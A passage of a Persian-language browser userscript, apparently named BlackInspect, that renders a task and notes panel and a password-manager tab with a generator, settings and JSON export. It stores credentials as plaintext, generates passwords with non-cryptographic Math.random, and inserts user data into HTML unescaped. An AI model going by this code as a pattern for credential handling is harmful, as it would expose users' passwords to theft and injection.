        ${activeTab==='tasks'&&showFP?`<div class="bi-tn-panel">
          <div class="bi-tn-plabel">📅 سررسید</div>
          <div class="bi-tn-chips">${[['today','امروز'],['week','این هفته'],['past','گذشته'],['none','بدون سررسید']].map(([v,l])=>`<button class="bi-tn-chip ${filter.due===v?'on':''}" data-fdue="${v}">${l}</button>`).join('')}</div>
          <div class="bi-tn-plabel" style="margin-top:10px">🚩 اولویت</div>
          <div class="bi-tn-chips">${[['high','🔴 بالا'],['medium','🟡 متوسط'],['low','🟢 پایین'],['','بدون اولویت']].map(([v,l])=>`<button class="bi-tn-chip ${filter.pri===v?'on':''}" data-fpri="${v}">${l}</button>`).join('')}</div>
          ${labels.length?`<div class="bi-tn-plabel" style="margin-top:10px">🔖 برچسب‌ها</div><div class="bi-tn-chips">${labels.map(l=>`<button class="bi-tn-chip ${filter.labels.includes(l)?'on':''}" data-flbl="${l}">${l}</button>`).join('')}</div>`:''}
          ${hasFilter()?`<div class="bi-tn-danger" data-act="clearF" style="margin-top:8px">🗑 پاک کردن فیلتر</div>`:''}
        </div>`:''}
        ${activeTab==='tasks'&&showMore?`<div class="bi-tn-panel"><label style="display:flex;align-items:center;gap:9px;cursor:pointer;color:#ccc;font-size:13px;padding:3px 0"><input type="checkbox" ${showDone?'checked':''} data-act="done2" style="accent-color:#3b82f6;width:15px;height:15px"> نمایش انجام شده‌ها</label><div class="bi-tn-danger" data-act="delAllTasks">🗑 حذف همه تسک‌ها</div></div>`:''}
        ${activeTab==='notes'&&showMore?`<div class="bi-tn-panel"><div class="bi-tn-danger" data-act="delAllNotes">🗑 حذف همه یادداشت‌ها</div></div>`:''}
        ${activeTab==='tasks'&&addingTask?`
          <div class="bi-task-xp" id="bi-xp">
            <textarea id="bi-xp-ta" placeholder="عنوان تسک..." dir="rtl" autofocus></textarea>
            <div class="bi-task-xp-btns">
              <select id="bi-xp-pri" style="padding:4px 8px;background:#22222a;border:1px solid #2e2e3a;color:#aaa;border-radius:7px;font-size:11px;outline:none"><option value="">اولویت</option><option value="high" ${newPri==='high'?'selected':''}>🔴 بالا</option><option value="medium" ${newPri==='medium'?'selected':''}>🟡 متوسط</option><option value="low" ${newPri==='low'?'selected':''}>🟢 پایین</option></select>
              <input type="date" id="bi-xp-due" class="bi-due-input" value="${newDue}">
              <input type="text" id="bi-xp-lbl" class="bi-due-input" placeholder="برچسب (با , جدا کنید)" style="flex:1" value="${newLabels.join(',')}">
              <button class="bi-task-xp-sub" data-act="submitTask">افزودن ✓</button>
            </div>
          </div>
        `:''}
        <div class="bi-tn-body">
          ${activeTab==='tasks' ? renderTasks(filtered) : renderNotes(filtered)}
        </div>
        <div class="bi-tn-footer">
          ${activeTab==='tasks'?`
            <div class="bi-tn-inp-row"><input class="bi-tn-inp" id="bi-qi" placeholder="نوشتن تسک جدید..." dir="rtl"><button class="bi-tn-add task-add" data-act="addQTask">تسک ✓</button></div>
          `:`
            <div class="bi-tn-inp-row"><input class="bi-tn-inp note-inp" id="bi-ni" placeholder="نوشتن یادداشت جدید..." dir="rtl"><button class="bi-tn-add note-add" data-act="addNote">یادداشت 📋</button></div>
          `}
        </div>
      </div>`;
      bindAll();
    }

    function renderTasks(list) {
      if (!list.length) {
        const empty = !tasks.length || (!showDone && tasks.every(t=>t.done));
        return `<div class="bi-tn-empty"><div class="bi-tn-empty-ico">☑️</div><div class="bi-tn-empty-ttl">${empty?'هنوز تسکی ثبت نکردی!':'تسکی با این فیلتر پیدا نشد'}</div>${empty?`<div class="bi-tn-empty-sug">موضوعات پیشنهادی:</div><ul><li data-qi="کارهای روزانه">کارهای روزانه</li><li data-qi="لیست خرید">لیست خرید</li><li data-qi="یادآوری‌های پرداخت">یادآوری‌های پرداخت</li><li data-qi="خواندن کتاب">خواندن کتاب</li></ul>`:''}</div>`;
      }
      return list.map(t=>{
        const pMap={high:['high','🔴 بالا'],medium:['medium','🟡 متوسط'],low:['low','🟢 پایین']};
        const [pc,pl]=pMap[t.pri]||[];
        const late = t.due&&!t.done&&isPast(t.due)&&!isToday(t.due);
        return `<div class="bi-task-card ${t.done?'done-card':''}"><div class="bi-task-top"><div class="bi-task-check ${t.done?'done-c':''}" data-toggle="${t.id}">${t.done?'✓':''}</div><div class="bi-task-text ${t.done?'done-t':''}">${t.title}</div><div class="bi-task-btns"><button class="bi-task-ibtn del" data-tdel="${t.id}">🗑</button></div></div>${(t.pri||t.due||(t.labels||[]).length)?`<div class="bi-task-meta">${pc?`<span class="bi-pri ${pc}">${pl}</span>`:''}${t.due?`<span class="bi-due ${late?'late':''}">📅 ${fmtDate(t.due)}${late?' (گذشته)':''}</span>`:''}${(t.labels||[]).map(l=>`<span class="bi-lbl">🔖 ${l}</span>`).join('')}</div>`:''}</div>`;
      }).join('');
    }

    function renderNotes(list) {
      if (!list.length) return `<div class="bi-tn-empty"><div class="bi-tn-empty-ico">📋</div><div class="bi-tn-empty-ttl">${noteQ?'یادداشتی یافت نشد':'هنوز یادداشتی ثبت نکردی!'}</div>${!noteQ?`<div class="bi-tn-empty-sug">موضوعات پیشنهادی:</div><ul><li data-ni="ژورنال روزانه">ژورنال روزانه</li><li data-ni="برنامه‌ریزی برای ماه">برنامه‌ریزی برای ماه جدید</li><li data-ni="لیست اهداف">نوشتن لیست اهداف</li></ul>`:''}</div>`;
      return list.map(n=>`<div class="bi-note-card"><div class="bi-note-head"><div class="bi-note-ttl">${n.title}</div><button class="bi-task-ibtn del" data-ndel="${n.id}">🗑</button></div>${n.body?`<div class="bi-note-prev">${n.body}</div>`:''}<div class="bi-note-date">📅 ${fmtDate(n.created)}</div></div>`).join('');
    }

    function bindAll() {
      const W = container.querySelector('.bi-tn');
      if (!W) return;
      W.querySelectorAll('[data-act]').forEach(el => {
        const evt = el.tagName==='INPUT'&&el.type!=='checkbox' ? 'input' : 'click';
        el.addEventListener(evt, (e) => {
          e.stopPropagation();
          const a = el.dataset.act;
          if (a==='tab-notes')    { activeTab='notes'; showFP=showSP=showMore=false; GM_setValue('bi_tn_active','notes'); render(); }
          else if (a==='tab-tasks') { activeTab='tasks'; showFP=showSP=showMore=false; GM_setValue('bi_tn_active','tasks'); render(); }
          else if (a==='filter')  { showFP=!showFP; showSP=false; showMore=false; render(); }
          else if (a==='sort')    { showSP=!showSP; showFP=false; showMore=false; render(); }
          else if (a==='more')    { showMore=!showMore; showFP=false; showSP=false; render(); }
          else if (a==='moreN')   { showMore=!showMore; render(); }
          else if (a==='done'||a==='done2') { showDone=!showDone; render(); }
          else if (a==='clearF')  { filter={due:'',pri:'',labels:[]}; render(); }
          else if (a==='search')  { noteQ=el.value.toLowerCase(); render(); }
          else if (a==='delAllTasks')  { if(confirm('همه تسک‌ها حذف شوند؟')){tasks=[];saveTasks();render();} }
          else if (a==='delAllNotes') { if(confirm('همه یادداشت‌ها حذف شوند؟')){notes=[];saveNotes();render();} }
          else if (a==='addQTask') {
            const inp=W.querySelector('#bi-qi'); const txt=(inp?.value||'').trim();
            if (!txt) { addingTask=true; render(); W.querySelector('#bi-xp-ta')?.focus(); return; }
            tasks.push({id:uid(),title:txt,done:false,pri:'',due:null,labels:[],created:Date.now()});
            saveTasks(); inp.value=''; render();
          }
          else if (a==='submitTask') {
            const ta=W.querySelector('#bi-xp-ta'), txt=(ta?.value||'').trim();
            if (!txt) return;
            const pri=W.querySelector('#bi-xp-pri')?.value||'';
            const dueV=W.querySelector('#bi-xp-due')?.value;
            const lblV=W.querySelector('#bi-xp-lbl')?.value||'';
            const lbls=lblV.split(',').map(s=>s.trim()).filter(Boolean);
            tasks.push({id:uid(),title:txt,done:false,pri,due:dueV?new Date(dueV).getTime():null,labels:lbls,created:Date.now()});
            saveTasks(); addingTask=false; render();
          }
          else if (a==='addNote') {
            const inp=W.querySelector('#bi-ni'); const txt=(inp?.value||'').trim();
            if (!txt) return;
            notes.push({id:uid(),title:txt,body:'',created:Date.now()});
            saveNotes(); inp.value=''; render();
          }
        });
      });
      W.querySelectorAll('input[name="bi-sort"]').forEach(r => r.addEventListener('change', ()=>{sortBy=r.value;render();}));
      W.querySelectorAll('[data-fdue]').forEach(b => b.addEventListener('click',()=>{ filter.due=filter.due===b.dataset.fdue?'':b.dataset.fdue; render(); }));
      W.querySelectorAll('[data-fpri]').forEach(b => b.addEventListener('click',()=>{ filter.pri=filter.pri===b.dataset.fpri?'':b.dataset.fpri; render(); }));
      W.querySelectorAll('[data-flbl]').forEach(b => b.addEventListener('click',()=>{ const l=b.dataset.flbl, i=filter.labels.indexOf(l); if(i>=0) filter.labels.splice(i,1); else filter.labels.push(l); render(); }));
      W.querySelectorAll('[data-toggle]').forEach(el => el.addEventListener('click',()=>{ const t=tasks.find(x=>x.id===el.dataset.toggle); if(t){t.done=!t.done;saveTasks();render();} }));
      W.querySelectorAll('[data-tdel]').forEach(b => b.addEventListener('click',e=>{ e.stopPropagation(); tasks=tasks.filter(t=>t.id!==b.dataset.tdel); saveTasks(); render(); }));
      W.querySelectorAll('[data-ndel]').forEach(b => b.addEventListener('click',e=>{ e.stopPropagation(); notes=notes.filter(n=>n.id!==b.dataset.ndel); saveNotes(); render(); }));
      W.querySelectorAll('[data-qi]').forEach(li => li.addEventListener('click',()=>{ const inp=W.querySelector('#bi-qi'); if(inp){inp.value=li.dataset.qi;inp.focus();} }));
      W.querySelectorAll('[data-ni]').forEach(li => li.addEventListener('click',()=>{ const inp=W.querySelector('#bi-ni'); if(inp){inp.value=li.dataset.ni;inp.focus();} }));
      const qi=W.querySelector('#bi-qi'); if(qi) qi.addEventListener('keydown',e=>{ if(e.key==='Enter') W.querySelector('[data-act="addQTask"]')?.click(); });
      const ni=W.querySelector('#bi-ni'); if(ni) ni.addEventListener('keydown',e=>{ if(e.key==='Enter') W.querySelector('[data-act="addNote"]')?.click(); });
    }
    render();
  }

  // biRenderPassTab - Password Manager (LastPass-style)
  function biRenderPassTab(container) {
    if (!document.getElementById('bi-pass-style')) {
      const s = document.createElement('style');
      s.id = 'bi-pass-style';
      s.textContent = `
        .bi-pass { display:flex; flex-direction:column; height:100%; direction:rtl; font-family:'Vazirmatn','Tahoma',sans-serif; }
        .bi-pass-top { padding:10px; display:flex; gap:7px; align-items:center; flex-shrink:0; }
        .bi-pass-search { flex:1; background:#1c1c24; border:1px solid #2e2e3a; border-radius:10px; color:#eee; padding:8px 12px; font-size:13px; outline:none; direction:rtl; transition:.15s; }
        .bi-pass-search:focus { border-color:#3b82f6; }
        .bi-pass-btn { padding:8px 14px; border-radius:9px; border:none; cursor:pointer; font-size:13px; font-weight:700; transition:all .15s; white-space:nowrap; }
        .bi-pass-btn.prim { background:#3b82f6; color:#fff; }
        .bi-pass-btn.prim:hover { background:#2563eb; }
        .bi-pass-btn.sec  { background:#22222a; color:#aaa; border:1px solid #2e2e3a; }
        .bi-pass-btn.sec:hover { color:#eee; border-color:#444; }
        .bi-pass-tabs { display:flex; border-bottom:1px solid #1e1e28; padding:0 10px; flex-shrink:0; }
        .bi-pass-ttab { padding:7px 14px; font-size:12px; color:#666; cursor:pointer; border-bottom:2px solid transparent; transition:.15s; font-weight:600; }
        .bi-pass-ttab.on { color:#3b82f6; border-bottom-color:#3b82f6; }
        .bi-pass-body { flex:1; overflow-y:auto; padding:8px 10px; }
        .bi-pass-body::-webkit-scrollbar { width:4px; }
        .bi-pass-body::-webkit-scrollbar-thumb { background:#2e2e3a; border-radius:4px; }
        .bi-cred { background:#18181f; border:1px solid #26262e; border-radius:12px; padding:13px 14px; margin-bottom:7px; transition:all .15s; }
        .bi-cred:hover { border-color:#3b82f644; }
        .bi-cred-top { display:flex; align-items:center; gap:10px; }
        .bi-cred-fav { width:34px; height:34px; border-radius:8px; background:#22222a; display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0; }
        .bi-cred-info { flex:1; min-width:0; }
        .bi-cred-site { font-size:13px; color:#eee; font-weight:600; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .bi-cred-user { font-size:11px; color:#777; margin-top:2px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .bi-cred-acts { display:flex; gap:4px; opacity:0; transition:.15s; }
        .bi-cred:hover .bi-cred-acts { opacity:1; }
        .bi-cred-ibtn { width:28px; height:28px; border-radius:7px; border:none; background:#22222a; color:#888; cursor:pointer; font-size:12px; display:flex; align-items:center; justify-content:center; transition:.15s; }
        .bi-cred-ibtn:hover { background:#2e2e38; color:#ddd; }
        .bi-cred-ibtn.del:hover { background:#2a0808; color:#ff5555; }
        .bi-cred-fields { margin-top:10px; display:flex; flex-direction:column; gap:6px; }
        .bi-cred-field { background:#22222a; border-radius:8px; padding:8px 11px; display:flex; align-items:center; gap:8px; }
        .bi-cred-flabel { font-size:10px; color:#666; width:50px; flex-shrink:0; }
        .bi-cred-fval { flex:1; font-size:12px; color:#ccc; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-family:monospace; letter-spacing:.5px; }
        .bi-cred-fbtns { display:flex; gap:4px; }
        .bi-cred-fbtn { padding:3px 8px; border-radius:6px; border:none; background:#1c1c24; color:#888; cursor:pointer; font-size:11px; transition:.15s; }
        .bi-cred-fbtn:hover { color:#eee; background:#2e2e3a; }
        .bi-cred-fbtn.copied { background:#0a2a12; color:#4ade80; }
        .bi-pass-empty { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px; padding:30px 20px; text-align:center; height:200px; }
        .bi-pass-empty-ico { font-size:46px; opacity:.3; }
        .bi-pass-empty-ttl { font-size:14px; color:#888; }
        .bi-pass-form { padding:10px; }
        .bi-pass-fld { margin-bottom:10px; }
        .bi-pass-flbl { font-size:11px; color:#888; margin-bottom:5px; display:block; font-weight:600; }
        .bi-pass-finp { width:100%; background:#1c1c24; border:1px solid #2e2e3a; border-radius:9px; color:#eee; padding:9px 12px; font-size:13px; outline:none; direction:rtl; box-sizing:border-box; transition:.15s; }
        .bi-pass-finp:focus { border-color:#3b82f6; }
        .bi-pass-finp[type=password] { font-family:monospace; letter-spacing:2px; }
        .bi-pass-inp-row { display:flex; gap:6px; align-items:center; }
        .bi-pass-inp-row .bi-pass-finp { flex:1; }
        .bi-pass-fbtm { display:flex; gap:8px; margin-top:14px; }
        .bi-gen { padding:10px; }
        .bi-gen-out { background:#1c1c24; border:1px solid #2e2e3a; border-radius:10px; padding:14px; font-family:monospace; font-size:15px; color:#5ba8ff; letter-spacing:2px; text-align:center; word-break:break-all; min-height:48px; display:flex; align-items:center; justify-content:center; margin-bottom:10px; }
        .bi-gen-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; }
        .bi-gen-lbl { font-size:12px; color:#888; width:60px; flex-shrink:0; }
        .bi-gen-range { flex:1; accent-color:#3b82f6; }
        .bi-gen-val { font-size:13px; color:#3b82f6; font-weight:700; width:24px; text-align:center; }
        .bi-gen-checks { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:12px; }
        .bi-gen-check { display:flex; align-items:center; gap:6px; cursor:pointer; font-size:12px; color:#aaa; }
        .bi-gen-check input { accent-color:#3b82f6; }
        .bi-gen-btns { display:flex; gap:8px; }
        .bi-pset { padding:10px; }
        .bi-pset-section { background:#18181f; border:1px solid #26262e; border-radius:12px; padding:13px; margin-bottom:10px; }
        .bi-pset-stitle { font-size:12px; color:#3b82f6; font-weight:700; margin-bottom:10px; display:flex; align-items:center; gap:6px; }
        .bi-pset-row { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
        .bi-pset-lbl { font-size:12px; color:#888; flex:1; }
        .bi-pset-inp { background:#22222a; border:1px solid #2e2e3a; border-radius:7px; color:#eee; padding:6px 10px; font-size:12px; outline:none; direction:ltr; text-align:left; transition:.15s; }
        .bi-pset-inp:focus { border-color:#3b82f6; }
        .bi-pset-range { flex:1; accent-color:#3b82f6; }
        .bi-pset-badge { font-size:12px; color:#3b82f6; font-weight:700; }
      `;
      document.head.appendChild(s);
    }

    let creds    = JSON.parse(GM_getValue('bi_creds_v3','[]'));
    let pref     = JSON.parse(GM_getValue('bi_pass_pref','{}'));
    pref.len     = pref.len     || 16;
    pref.emails  = pref.emails  || [];
    pref.users   = pref.users   || [];

    let view   = 'list';
    let search = '';
    let shown  = {};
    let editId = null;
    let genPwd = '';
    let genOpts= { upper:true, lower:true, digits:true, sym:true, len:pref.len };

    const saveCreds = () => GM_setValue('bi_creds_v3', JSON.stringify(creds));
    const savePref  = () => GM_setValue('bi_pass_pref', JSON.stringify(pref));
    const uid = () => Date.now().toString(36) + Math.random().toString(36).slice(2,6);
    const domain = url => { try { return new URL(url.includes('://')?url:'https://'+url).hostname; } catch{return url;} };
    const emoji  = d => { const h=d.split('').reduce((a,c)=>a+c.charCodeAt(0),0); return ['🔐','🔒','🛡','🔑','🌐','🏠','💼','🎯'][h%8]; };

    function genPassword(len=16, opts={}) {
      const U='ABCDEFGHIJKLMNOPQRSTUVWXYZ', L='abcdefghijklmnopqrstuvwxyz', D='0123456789', S='!@#$%^&*()-_=+[]{}|;:,.<>?';
      let pool='', result='';
      if (opts.upper!==false)  { pool+=U; result+=U[Math.random()*U.length|0]; }
      if (opts.lower!==false)  { pool+=L; result+=L[Math.random()*L.length|0]; }
      if (opts.digits!==false) { pool+=D; result+=D[Math.random()*D.length|0]; }
      if (opts.sym!==false)    { pool+=S; result+=S[Math.random()*S.length|0]; }
      if (!pool) pool=L; if (!result) result=L[Math.random()*L.length|0];
      while (result.length<len) result+=pool[Math.random()*pool.length|0];
      return result.split('').sort(()=>Math.random()-.5).join('').slice(0,len);
    }

    function getFiltered() {
      if (!search) return creds;
      const q=search.toLowerCase();
      return creds.filter(c=>c.site.toLowerCase().includes(q)||c.user.toLowerCase().includes(q));
    }

    function render() {
      const list = getFiltered();
      container.innerHTML = `<div class="bi-pass">
        <div class="bi-pass-top">
          ${view==='list'?`
            <input class="bi-pass-search" placeholder="جستجو در رمزها..." value="${search}" data-act="search">
            <button class="bi-pass-btn prim" data-act="toAdd">+ جدید</button>
            <button class="bi-pass-btn sec" data-act="toGen">🔑</button>
          `:view==='gen'?`
            <button class="bi-pass-btn sec" data-act="toList">← برگشت</button>
            <span style="font-size:13px;color:#888;flex:1;text-align:center">تولید رمز</span>
          `:view==='settings'?`
            <button class="bi-pass-btn sec" data-act="toList">← برگشت</button>
            <span style="font-size:13px;color:#888;flex:1;text-align:center">تنظیمات</span>
          `:`
            <button class="bi-pass-btn sec" data-act="toList">← برگشت</button>
            <span style="font-size:13px;color:#888;flex:1;text-align:center">${editId?'ویرایش':'افزودن'} رمز</span>
          `}
        </div>
        ${view==='list'?`<div class="bi-pass-tabs"><span class="bi-pass-ttab on">🔒 رمزها (${creds.length})</span><span class="bi-pass-ttab" data-act="toSettings" style="cursor:pointer">⚙ تنظیمات</span></div>`:''}
        <div class="bi-pass-body">
          ${view==='list'  ? renderList(list)   : ''}
          ${view==='add'||view==='edit' ? renderForm() : ''}
          ${view==='gen'   ? renderGen()        : ''}
          ${view==='settings' ? renderSettings(): ''}
        </div>
      </div>`;
      bindPassEvents();
    }

    function renderList(list) {
      if (!list.length) return `<div class="bi-pass-empty"><div class="bi-pass-empty-ico">🔒</div><div class="bi-pass-empty-ttl">${search?'رمزی یافت نشد':'هنوز رمزی ذخیره نکردی!'}</div></div>`;
      return list.map(c=>`
        <div class="bi-cred" data-cid="${c.id}">
          <div class="bi-cred-top">
            <div class="bi-cred-fav">${emoji(c.site)}</div>
            <div class="bi-cred-info"><div class="bi-cred-site">${domain(c.site)}</div><div class="bi-cred-user">${c.user}</div></div>
            <div class="bi-cred-acts"><button class="bi-cred-ibtn" data-cedit="${c.id}" title="ویرایش">✏</button><button class="bi-cred-ibtn del" data-cdel="${c.id}" title="حذف">🗑</button></div>
          </div>
          <div class="bi-cred-fields">
            <div class="bi-cred-field"><span class="bi-cred-flabel">نام کاربری</span><span class="bi-cred-fval">${c.user}</span><div class="bi-cred-fbtns"><button class="bi-cred-fbtn" data-copy="${c.user}" title="کپی">📋</button></div></div>
            <div class="bi-cred-field"><span class="bi-cred-flabel">رمز عبور</span><span class="bi-cred-fval">${shown[c.id]?c.pass:'•'.repeat(Math.min(c.pass.length,14))}</span><div class="bi-cred-fbtns"><button class="bi-cred-fbtn" data-toggle-pwd="${c.id}" title="نمایش">${shown[c.id]?'🙈':'👁'}</button><button class="bi-cred-fbtn" data-copy="${c.pass}" title="کپی">📋</button></div></div>
            ${c.url?`<div class="bi-cred-field"><span class="bi-cred-flabel">آدرس</span><a class="bi-cred-fval" href="${c.url}" target="_blank" style="color:#5ba8ff;text-decoration:none">${c.url}</a></div>`:''}
          </div>
        </div>`).join('');
    }

    function renderForm() {
      const c = editId ? creds.find(x=>x.id===editId) : null;
      const sugEmails = pref.emails.slice(0,3);
      const sugUsers  = pref.users.slice(0,3);
      return `<div class="bi-pass-form">
        <div class="bi-pass-fld"><label class="bi-pass-flbl">🌐 سایت / آدرس</label><input class="bi-pass-finp" id="pf-site" placeholder="example.com" dir="ltr" value="${c?c.site:''}"></div>
        <div class="bi-pass-fld"><label class="bi-pass-flbl">👤 نام کاربری / ایمیل</label><div class="bi-pass-inp-row"><input class="bi-pass-finp" id="pf-user" placeholder="user@email.com" dir="ltr" value="${c?c.user:''}"></div>${sugEmails.length?`<div style="display:flex;gap:5px;flex-wrap:wrap;margin-top:5px">${sugEmails.map(e=>`<button style="padding:3px 8px;border-radius:6px;background:#0d1f36;border:1px solid #3b82f633;color:#5ba8ff;font-size:11px;cursor:pointer" data-fill-user="${e}">${e}</button>`).join('')}</div>`:''}</div>
        <div class="bi-pass-fld"><label class="bi-pass-flbl">🔑 رمز عبور</label><div class="bi-pass-inp-row"><input class="bi-pass-finp" id="pf-pass" type="password" placeholder="رمز عبور" dir="ltr" value="${c?c.pass:''}"><button class="bi-pass-btn sec" id="pf-eye" style="padding:8px 10px;font-size:16px">👁</button><button class="bi-pass-btn sec" data-act="genFill" style="padding:8px 10px;font-size:14px" title="تولید رمز با طول پیش‌فرض (${pref.len})">⚡</button></div><div style="font-size:11px;color:#555;margin-top:4px">طول پیش‌فرض: ${pref.len} کاراکتر — در تنظیمات قابل تغییر است</div></div>
        <div class="bi-pass-fld"><label class="bi-pass-flbl">🔗 آدرس کامل (اختیاری)</label><input class="bi-pass-finp" id="pf-url" placeholder="https://example.com/login" dir="ltr" value="${c?c.url||'':''}"></div>
        <div class="bi-pass-fld"><label class="bi-pass-flbl">📝 یادداشت (اختیاری)</label><input class="bi-pass-finp" id="pf-note" placeholder="یادداشت..." value="${c?c.note||'':''}"></div>
        <div class="bi-pass-fbtm"><button class="bi-pass-btn prim" data-act="saveForm">💾 ذخیره</button><button class="bi-pass-btn sec" data-act="toList">انصراف</button></div>
      </div>`;
    }

    function renderGen() {
      if (!genPwd) genPwd = genPassword(genOpts.len, genOpts);
      const strength = (()=>{ let s=0; if(genPwd.length>=12) s++; if(genPwd.length>=16) s++; if(/[A-Z]/.test(genPwd)&&/[a-z]/.test(genPwd)) s++; if(/\d/.test(genPwd)&&/[^A-Za-z0-9]/.test(genPwd)) s++; return Math.min(s,3); })();
      return `<div class="bi-gen">
        <div class="bi-gen-out" id="gen-out">${genPwd}</div>
        <div style="display:flex;gap:3px;margin-bottom:10px">${['ضعیف','متوسط','قوی','بسیار قوی'].map((l,i)=>`<div style="flex:1;height:4px;border-radius:2px;background:${strength>i?(['#ff5555','#fb923c','#3b82f6','#22c55e'][i]):'#222'}"></div>`).join('')}</div>
        <div class="bi-gen-row"><span class="bi-gen-lbl">طول رمز</span><input type="range" class="bi-gen-range" id="gen-len" min="8" max="32" value="${genOpts.len}"><span class="bi-gen-val" id="gen-len-val">${genOpts.len}</span></div>
        <div class="bi-gen-checks">${[['upper','حروف بزرگ'],['lower','حروف کوچک'],['digits','اعداد'],['sym','نمادها']].map(([k,l])=>`<label class="bi-gen-check"><input type="checkbox" id="gen-${k}" ${genOpts[k]?'checked':''}> ${l}</label>`).join('')}</div>
        <div class="bi-gen-btns"><button class="bi-pass-btn prim" data-act="reGen">🔄 تولید مجدد</button><button class="bi-pass-btn sec"  data-act="copyGen">📋 کپی</button><button class="bi-pass-btn sec"  data-act="setPref">⭐ ذخیره به عنوان پیش‌فرض</button></div>
      </div>`;
    }

    function renderSettings() {
      return `<div class="bi-pset">
        <div class="bi-pset-section"><div class="bi-pset-stitle">⚡ پیش‌فرض‌های سریع</div><div class="bi-pset-row"><span class="bi-pset-lbl">📏 طول رمز پیش‌فرض</span><span class="bi-pset-badge" id="ps-len-val">${pref.len}</span></div><input type="range" class="bi-pset-range" id="ps-len" min="8" max="32" value="${pref.len}" style="width:100%;margin-bottom:10px"><div style="font-size:11px;color:#555;margin-bottom:10px">وقتی روی ⚡ در فرم کلیک کنید، رمزی با این طول تولید می‌شود</div><div style="margin-bottom:8px"><label class="bi-pass-flbl">📧 ایمیل‌های ذخیره‌شده (پیشنهاد خودکار)</label><div class="bi-pass-inp-row" style="gap:6px"><input class="bi-pass-finp" id="ps-email" placeholder="email@example.com" dir="ltr" style="font-size:12px;padding:7px 10px"><button class="bi-pass-btn sec" data-act="addEmail" style="padding:7px 10px;font-size:12px">+ اضافه</button></div><div style="display:flex;gap:5px;flex-wrap:wrap;margin-top:6px">${pref.emails.map(e=>`<span style="padding:3px 9px;border-radius:20px;background:#0d1f36;border:1px solid #3b82f633;color:#5ba8ff;font-size:11px;display:flex;align-items:center;gap:5px">${e} <span style="cursor:pointer;color:#ff5555" data-del-email="${e}">×</span></span>`).join('')}</div></div><div><label class="bi-pass-flbl">👤 نام‌های کاربری ذخیره‌شده</label><div class="bi-pass-inp-row" style="gap:6px"><input class="bi-pass-finp" id="ps-user" placeholder="username" dir="ltr" style="font-size:12px;padding:7px 10px"><button class="bi-pass-btn sec" data-act="addUser" style="padding:7px 10px;font-size:12px">+ اضافه</button></div><div style="display:flex;gap:5px;flex-wrap:wrap;margin-top:6px">${pref.users.map(u=>`<span style="padding:3px 9px;border-radius:20px;background:#0d1f36;border:1px solid #3b82f633;color:#5ba8ff;font-size:11px;display:flex;align-items:center;gap:5px">${u} <span style="cursor:pointer;color:#ff5555" data-del-user="${u}">×</span></span>`).join('')}</div></div></div>
        <div class="bi-pset-section"><div class="bi-pset-stitle">🤖 تشخیص خودکار</div><p style="font-size:12px;color:#666;line-height:1.6">BlackInspect وقتی صفحه‌ای با فیلد رمز شناسایی می‌کند، رمزی با طول پیش‌فرض (${pref.len}) پیشنهاد می‌دهد. ایمیل‌ها و نام‌های کاربری ذخیره‌شده در فیلدهای مناسب پیشنهاد داده می‌شوند.</p><button class="bi-pass-btn prim" data-act="autoDetect" style="font-size:12px;padding:7px 12px">🔍 اجرای تشخیص خودکار در صفحه</button></div>
        <div class="bi-pset-section"><div class="bi-pset-stitle" style="color:#ff5555">⚠ مدیریت داده</div><button class="bi-pass-btn sec" data-act="exportCreds" style="font-size:12px;padding:7px 12px;margin-bottom:6px;display:block;width:100%">📤 خروجی JSON رمزها</button><button class="bi-pass-btn sec" data-act="delAllCreds" style="font-size:12px;padding:7px 12px;color:#ff5555;display:block;width:100%">🗑 حذف همه رمزها</button></div>
      </div>`;
    }

    function bindPassEvents() {
      const W = container.querySelector('.bi-pass');
      if (!W) return;
      W.querySelectorAll('[data-act]').forEach(el => {
        const evt = el.tagName==='INPUT'&&el.type!=='checkbox'? 'input':'click';
        el.addEventListener(evt, () => {
          const a=el.dataset.act;
          if      (a==='toList')    { view='list'; editId=null; render(); }
          else if (a==='toAdd')     { view='add'; editId=null; render(); }
          else if (a==='toGen')     { view='gen'; genPwd=''; render(); }
          else if (a==='toSettings'){ view='settings'; render(); }
          else if (a==='search')    { search=el.value; render(); }
          else if (a==='reGen')     { genPwd=genPassword(genOpts.len,genOpts); W.querySelector('#gen-out').textContent=genPwd; }
          else if (a==='copyGen')   { navigator.clipboard?.writeText(genPwd); el.textContent='✓ کپی شد'; setTimeout(()=>{el.textContent='📋 کپی';},1500); }
          else if (a==='setPref')   { pref.len=genOpts.len; savePref(); alert(`طول ${pref.len} به عنوان پیش‌فرض ذخیره شد`); }
          else if (a==='genFill')   { const p=genPassword(pref.len,{upper:true,lower:true,digits:true,sym:true}); const inp=W.querySelector('#pf-pass'); if(inp){inp.value=p;inp.type='text';} }
          else if (a==='saveForm') { const site=(W.querySelector('#pf-site')?.value||'').trim(); const user=(W.querySelector('#pf-user')?.value||'').trim(); const pass=(W.querySelector('#pf-pass')?.value||'').trim(); const url=(W.querySelector('#pf-url')?.value||'').trim(); const note=(W.querySelector('#pf-note')?.value||'').trim(); if(!site||!pass){alert('سایت و رمز عبور الزامی است');return;} if(user&&user.includes('@')&&!pref.emails.includes(user)) pref.emails.unshift(user); if(user&&!user.includes('@')&&!pref.users.includes(user)) pref.users.unshift(user); pref.emails=pref.emails.slice(0,5); pref.users=pref.users.slice(0,5); savePref(); if(editId){ const c=creds.find(x=>x.id===editId); if(c){Object.assign(c,{site,user,pass,url,note,updated:Date.now()});} } else{ creds.push({id:uid(),site,user,pass,url,note,created:Date.now()}); } saveCreds(); view='list'; editId=null; render(); }
          else if (a==='autoDetect') { biAutoFillDetect(pref); }
          else if (a==='exportCreds') { const blob=new Blob([JSON.stringify(creds,null,2)],{type:'application/json'}); const a2=document.createElement('a'); a2.href=URL.createObjectURL(blob); a2.download='blackinspect_passwords.json'; a2.click(); }
          else if (a==='delAllCreds') { if(confirm('همه رمزها حذف شوند؟')){ creds=[]; saveCreds(); render(); } }
          else if (a==='addEmail') { const v=(W.querySelector('#ps-email')?.value||'').trim(); if(v&&!pref.emails.includes(v)){pref.emails.push(v);savePref();render();} }
          else if (a==='addUser') { const v=(W.querySelector('#ps-user')?.value||'').trim(); if(v&&!pref.users.includes(v)){pref.users.push(v);savePref();render();} }
        });
      });
